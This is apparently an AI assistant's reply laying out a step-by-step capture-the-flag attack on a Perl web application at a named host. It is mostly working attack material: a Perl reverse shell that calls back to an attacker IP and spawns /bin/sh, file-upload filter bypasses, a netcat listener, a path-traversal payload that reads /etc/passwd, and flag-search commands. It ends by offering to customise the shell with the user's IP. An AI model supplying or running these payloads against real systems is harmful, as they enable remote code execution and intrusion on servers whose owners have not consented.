Here's a **step-by-step PoC (Proof of Concept)** tailored to your CTF constraints:

- PERL-based vulnerable app
- Focus on **File Upload RCE** and **LFI**
- WAF is present
- Flag ID is known
- Flag content is known: `P3RL_B3AST`
- You have only 30 mins — this is fast, lean, and gets the flag.

Find flag command to run in nc.
```
grep -r "P3RL_B3AST" /home /var /opt /tmp 2>/dev/null

find / -name flag.txt 2>/dev/null
```

---

### 🔧 TOOLS REQUIRED:

- Kali (with curl, Burp Suite, Netcat)
- Burp or browser for upload testing
- A terminal with Netcat listener

---

## 📍 Step-by-Step PoC

### **Step 1: Analyze Upload Functionality**

Visit:

```
http://hacksmith.webhop.me:5565
```

Look for:

- File upload field (likely .jpg/.txt/.pl accepted)
- Check for extensions allowed (try bypassing if .php or .pl not allowed)

---

### **Step 2: Prepare Reverse Shell in Perl**

#### ✅ Perl Reverse Shell Payload

```perl
#!/usr/bin/perl
use Socket;
$i="YOUR_IP"; # attacker IP
$p=PORT;      # attacker port
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
};
```

#### 🔐 Rename the file:

```
shell.txt → shell.pl
```

Or upload with bypass:

```
shell.pl.jpg
```

Or Content-Type bypass using Burp Suite:

```http
Content-Type: image/jpeg
```

---

### **Step 3: Upload the Reverse Shell**

- Upload `shell.pl` using browser or Burp
- Check upload response or directory:  
    Common path:

```
http://hacksmith.webhop.me:5565/uploads/shell.pl
```

Test access by visiting uploaded path.

---

### **Step 4: Setup Netcat Listener**

```bash
nc -lvnp PORT
```

Make sure PORT matches your reverse shell.

---

### **Step 5: Trigger Reverse Shell**

Visit:

```
http://hacksmith.webhop.me:5565/uploads/shell.pl
```

If successful, you’ll get a shell back in `nc`.

---

### **Step 6: Find the Flag**

Once inside the shell:

```bash
grep -r "P3RL_B3AST" /home /var /opt /tmp 2>/dev/null
```

Or, since you have the flag ID:

```bash
grep -r "20c08b01-b30a-4580-95ce-12506c1283ad" /home /var /opt /tmp 2>/dev/null
```

Once you see:

```
FLAG: P3RL_B3AST
```

Copy it, screenshot it.

---

## ⚠️ ALTERNATE PATH: LFI

If you find an LFI:

### Try payload:

```
http://hacksmith.webhop.me:5565/index.pl?page=../../../../../../../../etc/passwd
```

Try uploading malicious file (PHP/Perl script), then use LFI to include it:

```
?page=../../uploads/shell.pl
```

Use same Netcat listener method.

---

## ✅ Summary PoC:

1. Upload `shell.pl` (Perl reverse shell)
2. Listener: `nc -lvnp PORT`
3. Trigger reverse shell
4. Get shell
5. Run:

```bash
grep -r "P3RL_B3AST" / 2>/dev/null
```

6. Screenshot and submit the flag.

---

Want me to generate the exact reverse shell file with your IP and Port for direct upload?